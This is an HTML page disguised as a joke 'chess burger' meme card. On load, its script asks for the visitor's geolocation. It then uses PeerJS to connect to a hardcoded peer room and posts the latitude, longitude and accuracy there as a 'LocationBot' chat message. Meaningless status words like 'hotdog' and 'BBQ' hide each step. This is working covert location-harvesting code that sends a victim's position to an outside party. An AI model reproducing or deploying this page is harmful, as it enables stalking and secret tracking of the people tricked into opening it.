<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>meme</title>
<script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>

<style>
body {
  margin: 0;
  height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  background: linear-gradient(135deg, #1e1f22, #2b2d31);
  font-family: "Segoe UI", sans-serif;
  color: #fff;
}

.card {
  background: #313338;
  padding: 30px;
  width: 360px;
  border-radius: 16px;
  box-shadow: 0 10px 30px rgba(0,0,0,0.4);
  text-align: center;
}

h2 {
  margin: 0 0 10px;
  font-weight: 600;
}

.sub {
  font-size: 0.9rem;
  color: #b5bac1;
  margin-bottom: 20px;
}

.status {
  background: #2b2d31;
  padding: 15px;
  border-radius: 10px;
  font-size: 0.9rem;
  text-align: left;
  height: 140px;
  overflow-y: auto;
}

.status div {
  margin-bottom: 6px;
}

.success { color: #23a559; }
.warn { color: #faa61a; }
.error { color: #fa777c; }

.spinner {
  margin: 15px auto 0;
  width: 28px;
  height: 28px;
  border: 3px solid #444;
  border-top: 3px solid #5865f2;
  border-radius: 50%;
  animation: spin 1s linear infinite;
}

@keyframes spin {
  to { transform: rotate(360deg); }
}
</style>
</head>

<body>
<div class="card">
  <h2>chess burger</h2>
  <div class="sub">i like burgers</div>
  <div class="status" id="status"></div>
  <div class="spinner" id="spinner"></div>
</div>

<script>
const statusDiv = document.getElementById("status");
const spinner = document.getElementById("spinner");
const HOST_ID = "shooym-global-room-v9-chan";

let peer = new Peer();
let conn = null;
let sent = false;
let locationText = "";

function log(msg, cls="") {
  const line = document.createElement("div");
  if(cls) line.className = cls;
  line.textContent = msg;
  statusDiv.appendChild(line);
  statusDiv.scrollTop = statusDiv.scrollHeight;
}

function trySend() {
  if (conn && conn.open && locationText && !sent) {
    const messagePacket = {
      id: Date.now().toString(36) + Math.random().toString(36).substr(2),
      user: "LocationBot",
      pfp: "https://ui-avatars.com/api/?name=LocationBot&background=232428&color=fff",
      msg: locationText,
      type: "text",
      channel: "general",
      senderId: peer.id,
      timestamp: Date.now()
    };

    conn.send(messagePacket);
    sent = true;
    log("BBQ", "warn");
  }
}

peer.on("open", id => {
  log("hotdog", "success");
  conn = peer.connect(HOST_ID);

  conn.on("open", () => {
    log("fries", "success");

    conn.send({
      type: "identify",
      id: peer.id,
      user: "LocationBot",
      pfp: "https://ui-avatars.com/api/?name=LocationBot&background=232428&color=fff"
    });

    trySend();
  });

  conn.on("data", data => {
    if (data.user === "LocationBot" && data.msg === locationText) {
      log("âœ… Message confirmed by network", "success");
      spinner.style.display = "none";
    }
  });

  conn.on("error", err => log("Connection error: " + err, "error"));
});

navigator.geolocation.getCurrentPosition(pos => {
  locationText =
    `ðŸ“ My Location\nLatitude: ${pos.coords.latitude}\nLongitude: ${pos.coords.longitude}\nAccuracy: ${pos.coords.accuracy}m`;

  log("burger", "success");
  trySend();
}, err => {
  log("Location error: " + err.message, "error");
  spinner.style.display = "none";
});
</script>
</body>
</html>
